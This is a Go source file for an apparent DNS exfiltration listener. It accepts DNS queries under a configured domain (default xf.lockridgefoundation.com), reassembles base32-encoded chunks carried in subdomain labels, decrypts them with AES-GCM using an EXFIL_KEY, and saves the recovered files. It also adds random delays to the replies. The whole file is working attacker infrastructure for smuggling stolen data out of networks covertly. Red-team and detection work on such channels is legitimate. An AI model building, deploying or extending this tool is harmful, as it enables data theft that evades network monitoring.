package main

import (
        "crypto/aes"
        "crypto/cipher"
        "encoding/base32"
        "encoding/hex"
        "errors"
        "flag"
        "fmt"
        "log"
        "math/rand"
        "net"
        "os"
        "path"
        "strconv"
        "sync"
        "time"
  "strings"
  "sort"

        "github.com/joho/godotenv"
        "github.com/miekg/dns"
)

var (
        exfilKey        []byte
        dataFragments   = make(map[string]map[int]string)
        expectedCounts  = make(map[string]int)
        lastSeen        = make(map[string]time.Time)
        mu              sync.Mutex
        outputDirectory string
        domainSuffix    string
        rateLow         int
        rateHigh        int
)

func init() {
        _ = godotenv.Load()
        keyHex := os.Getenv("EXFIL_KEY")
        var err error
        exfilKey, err = hex.DecodeString(keyHex)
        if err != nil || len(exfilKey) != 32 {
                log.Fatalf("Invalid EXFIL_KEY (must be 64 hex characters): %v", keyHex)
        }
}

func decryptAESGCM(blob []byte) ([]byte, error) {
        if len(blob) < 12 {
                return nil, errors.New("ciphertext too short")
        }
        nonce := blob[:12]
        ct := blob[12:]

        block, err := aes.NewCipher(exfilKey)
        if err != nil {
                return nil, err
        }
        aesgcm, err := cipher.NewGCM(block)
        if err != nil {
                return nil, err
        }
        return aesgcm.Open(nil, nonce, ct, nil)
}

func handleDNSRequest(w dns.ResponseWriter, r *dns.Msg) {
        if len(r.Question) == 0 {
                return
        }
        q := r.Question[0]
        name := strings.TrimSuffix(q.Name, ".")
        if !strings.HasSuffix(strings.ToLower(name), domainSuffix) {
                return
        }

        // Parse label prefix
        sub := strings.TrimSuffix(name, "."+domainSuffix)
        parts := strings.SplitN(sub, "-", 4)
        if len(parts) != 4 {
                log.Printf("Invalid format: %s", sub)
                return
        }

        identifier := strings.ToLower(parts[0])
        idx, err1 := strconv.Atoi(parts[1])
        total, err2 := strconv.Atoi(parts[2])
        payload := parts[3]
        if err1 != nil || err2 != nil {
                log.Printf("Failed to parse segment numbers: %s", sub)
                return
        }

        // Simulated jitter
        delay := rand.Intn(rateHigh-rateLow) + rateLow
        time.Sleep(time.Duration(delay) * time.Millisecond)

        mu.Lock()
        defer mu.Unlock()

        if _, ok := dataFragments[identifier]; !ok {
                dataFragments[identifier] = make(map[int]string)
        }
        dataFragments[identifier][idx] = payload
        expectedCounts[identifier] = total
        lastSeen[identifier] = time.Now()

        log.Printf("[%s] Received chunk %d/%d", identifier, idx+1, total)

        if len(dataFragments[identifier]) == total {
                assembleAndSave(identifier)
                delete(dataFragments, identifier)
                delete(expectedCounts, identifier)
                delete(lastSeen, identifier)
        }

        // Build response
        msg := new(dns.Msg)
        msg.SetReply(r)
        msg.Answer = append(msg.Answer, &dns.A{
                Hdr: dns.RR_Header{
                        Name:   r.Question[0].Name,
                        Rrtype: dns.TypeA,
                        Class:  dns.ClassINET,
                        Ttl:    300,
                },
                A: net.ParseIP("192.0.2.1").To4(),
        })
        _ = w.WriteMsg(msg)
}

func assembleAndSave(identifier string) {
        fragments := dataFragments[identifier]
        count := expectedCounts[identifier]

        // Sort and collect fragment keys
        keys := make([]int, 0, len(fragments))
        for k := range fragments {
                keys = append(keys, k)
        }
        sort.Ints(keys)
        log.Printf("[%s] Chunk indexes received: %v", identifier, keys)

        // Reassemble the payload in order
        ordered := make([]string, count)
        for i := 0; i < count; i++ {
                chunk, ok := fragments[i]
                if !ok {
                        log.Printf("[%s] Missing chunk %d", identifier, i)
                        return
                }
                ordered[i] = chunk
        }

        full := strings.Join(ordered, "")
        for i, r := range full {
                if !((r >= 'A' && r <= 'Z') || (r >= '2' && r <= '7')) {
                        log.Printf("[%s] Invalid Base32 character '%c' at position %d", identifier, r, i)
                        break
                }
        }

        // Convert to uppercase (Go's base32 is case-sensitive)
        upper := strings.ToUpper(full)

        decoded, err := base32.StdEncoding.WithPadding(base32.NoPadding).DecodeString(upper)
        if err != nil {
                log.Printf("[%s] Base32 decode error: %v", identifier, err)
                return
        }

        plaintext, err := decryptAESGCM(decoded)
        if err != nil {
                log.Printf("[%s] AES-GCM decryption error: %v", identifier, err)
                return
        }

        os.MkdirAll(outputDirectory, 0755)
        outPath := path.Join(outputDirectory, fmt.Sprintf("%s.bin", identifier))
        err = os.WriteFile(outPath, plaintext, 0644)
        if err != nil {
                log.Printf("[%s] Failed to write file: %v", identifier, err)
        } else {
                log.Printf("[%s] File saved: %s", identifier, outPath)
        }
}


func min(a, b int) int {
        if a < b {
                return a
        }
        return b
}

func cleanupExpired(ttl time.Duration, interval time.Duration) {
        for {
                time.Sleep(interval)
                now := time.Now()

                mu.Lock()
                for id, ts := range lastSeen {
                        if now.Sub(ts) > ttl {
                                log.Printf("[%s] Expired due to timeout", id)
                                delete(dataFragments, id)
                                delete(expectedCounts, id)
                                delete(lastSeen, id)
                        }
                }
                mu.Unlock()
        }
}

func main() {
        port := flag.Int("port", 5300, "UDP port to listen on")
        output := flag.String("output-dir", "output", "Directory to save recovered files")
        low := flag.Int("low", 100, "Minimum artificial delay (ms)")
        high := flag.Int("high", 1500, "Maximum artificial delay (ms)")
        domain := flag.String("domain", "xf.lockridgefoundation.com", "Domain suffix to match")
        flag.Parse()

        outputDirectory = *output
        domainSuffix = strings.TrimSuffix(*domain, ".")
        rateLow = *low
        rateHigh = *high

        go cleanupExpired(10*time.Minute, 1*time.Minute)

        dns.HandleFunc(".", handleDNSRequest)
        server := &dns.Server{Addr: fmt.Sprintf(":%d", *port), Net: "udp"}

        log.Printf("Listening on UDP/%d...", *port)
        if err := server.ListenAndServe(); err != nil {
                log.Fatalf("Failed to start DNS server: %v", err)
        }
}
